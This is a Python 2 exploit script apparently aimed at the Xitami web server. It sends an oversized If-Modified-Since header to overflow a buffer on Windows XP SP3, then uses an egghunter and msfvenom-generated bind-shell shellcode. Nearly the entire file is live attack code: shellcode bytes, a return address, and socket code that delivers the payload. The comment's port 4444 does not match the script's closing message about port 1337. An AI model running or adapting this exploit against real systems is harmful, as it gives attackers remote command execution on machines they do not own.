import time
import socket
import sys

if len(sys.argv) != 3:
    print "Usage: ./xitami.py <Target IP> <Target Port>"
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])

egghunt = ("\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02"
"\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
"w00t" # 4 byte tag
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7")

#msfvenom -a x86 --platform Windows -p windows/shell_bind_tcp LHOST=192.168.1.169 LPORT=4444 -e x86/alpha_mixed -f c

shellcode = ("\x89\xe5\xda\xd2\xd9\x75\xf4\x5f\x57\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x6b\x4c\x6a\x48\x4b\x32\x73\x30\x35\x50\x47\x70\x35\x30\x4d"
"\x59\x48\x65\x66\x51\x6f\x30\x61\x74\x4c\x4b\x56\x30\x54\x70"
"\x4e\x6b\x52\x72\x76\x6c\x4e\x6b\x70\x52\x46\x74\x4c\x4b\x43"
"\x42\x46\x48\x36\x6f\x4f\x47\x62\x6a\x55\x76\x30\x31\x69\x6f"
"\x6c\x6c\x67\x4c\x65\x31\x51\x6c\x55\x52\x74\x6c\x67\x50\x6a"
"\x61\x68\x4f\x34\x4d\x46\x61\x58\x47\x59\x72\x5a\x52\x76\x32"
"\x46\x37\x6c\x4b\x42\x72\x74\x50\x4c\x4b\x50\x4a\x37\x4c\x6c"
"\x4b\x32\x6c\x32\x31\x63\x48\x6b\x53\x33\x78\x47\x71\x48\x51"
"\x73\x61\x4c\x4b\x31\x49\x57\x50\x33\x31\x6a\x73\x6c\x4b\x33"
"\x79\x77\x68\x39\x73\x77\x4a\x30\x49\x6c\x4b\x77\x44\x6e\x6b"
"\x36\x61\x68\x56\x55\x61\x6b\x4f\x6c\x6c\x69\x51\x78\x4f\x46"
"\x6d\x46\x61\x69\x57\x75\x68\x6d\x30\x71\x65\x48\x76\x67\x73"
"\x73\x4d\x38\x78\x65\x6b\x61\x6d\x37\x54\x62\x55\x59\x74\x71"
"\x48\x4e\x6b\x76\x38\x51\x34\x73\x31\x6a\x73\x55\x36\x6e\x6b"
"\x74\x4c\x70\x4b\x6e\x6b\x71\x48\x47\x6c\x47\x71\x6b\x63\x4e"
"\x6b\x44\x44\x6c\x4b\x76\x61\x6e\x30\x4c\x49\x73\x74\x76\x44"
"\x64\x64\x51\x4b\x51\x4b\x31\x71\x33\x69\x32\x7a\x76\x31\x59"
"\x6f\x6b\x50\x73\x6f\x51\x4f\x31\x4a\x4c\x4b\x67\x62\x7a\x4b"
"\x4e\x6d\x73\x6d\x32\x48\x75\x63\x44\x72\x35\x50\x35\x50\x71"
"\x78\x30\x77\x33\x43\x57\x42\x51\x4f\x73\x64\x50\x68\x30\x4c"
"\x62\x57\x65\x76\x67\x77\x79\x6f\x48\x55\x4e\x58\x4a\x30\x77"
"\x71\x77\x70\x67\x70\x55\x79\x49\x54\x30\x54\x36\x30\x33\x58"
"\x61\x39\x6f\x70\x30\x6b\x65\x50\x49\x6f\x6e\x35\x50\x6a\x67"
"\x78\x66\x39\x70\x50\x79\x72\x4b\x4d\x67\x30\x30\x50\x73\x70"
"\x30\x50\x65\x38\x79\x7a\x36\x6f\x39\x4f\x6d\x30\x79\x6f\x79"
"\x45\x4a\x37\x61\x78\x46\x62\x67\x70\x76\x71\x63\x6c\x4e\x69"
"\x4d\x36\x52\x4a\x62\x30\x43\x66\x51\x47\x70\x68\x4b\x72\x4b"
"\x6b\x67\x47\x52\x47\x69\x6f\x4b\x65\x46\x37\x30\x68\x4c\x77"
"\x4b\x59\x75\x68\x39\x6f\x6b\x4f\x4e\x35\x32\x77\x43\x58\x30"
"\x74\x78\x6c\x65\x6b\x49\x71\x39\x6f\x4b\x65\x63\x67\x4a\x37"
"\x61\x78\x33\x45\x52\x4e\x50\x4d\x63\x51\x4b\x4f\x69\x45\x52"
"\x48\x72\x43\x42\x4d\x55\x34\x75\x50\x4f\x79\x39\x73\x66\x37"
"\x43\x67\x50\x57\x75\x61\x78\x76\x42\x4a\x37\x62\x46\x39\x31"
"\x46\x59\x72\x59\x6d\x42\x46\x48\x47\x57\x34\x67\x54\x45\x6c"
"\x76\x61\x66\x61\x6e\x6d\x33\x74\x61\x34\x36\x70\x5a\x66\x75"
"\x50\x31\x54\x53\x64\x52\x70\x62\x76\x61\x46\x76\x36\x51\x56"
"\x33\x66\x50\x4e\x76\x36\x31\x46\x66\x33\x70\x56\x63\x58\x34"
"\x39\x38\x4c\x45\x6f\x6f\x76\x79\x6f\x4e\x35\x4b\x39\x39\x70"
"\x70\x4e\x56\x36\x37\x36\x6b\x4f\x46\x50\x70\x68\x57\x78\x4c"
"\x47\x57\x6d\x55\x30\x79\x6f\x58\x55\x6d\x6b\x68\x70\x4c\x75"
"\x6c\x62\x36\x36\x30\x68\x79\x36\x4c\x55\x6f\x4d\x4f\x6d\x69"
"\x6f\x6b\x65\x35\x6c\x67\x76\x63\x4c\x45\x5a\x6f\x70\x39\x6b"
"\x6d\x30\x33\x45\x74\x45\x4d\x6b\x50\x47\x76\x73\x30\x72\x30"
"\x6f\x71\x7a\x35\x50\x56\x33\x59\x6f\x68\x55\x41\x41")

jump = "\xeb\x22" # short jump

buf = "A" * 72                  
buf += "\xD7\x30\x9D\x7C" # jmp esp (user32.dll) / XP SP3 English
buf += jump
buf += "\x90" * 50
buf += egghunt
buf += "w00tw00t" # tag
buf += shellcode

header = (
'GET / HTTP/1.1\r\n'
'Host: %s\r\n'
'If-Modified-Since: pwned, %s\r\n'
'\r\n') % (target, buf)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((target, port))
    print "[+] Connected"
except:
    print "[!] Connection Failed"
    sys.exit(0)

print "[+] Sending payload..."
s.send(header)
time.sleep(1)
s.close()

print "[+] Check port 1337 for your shell"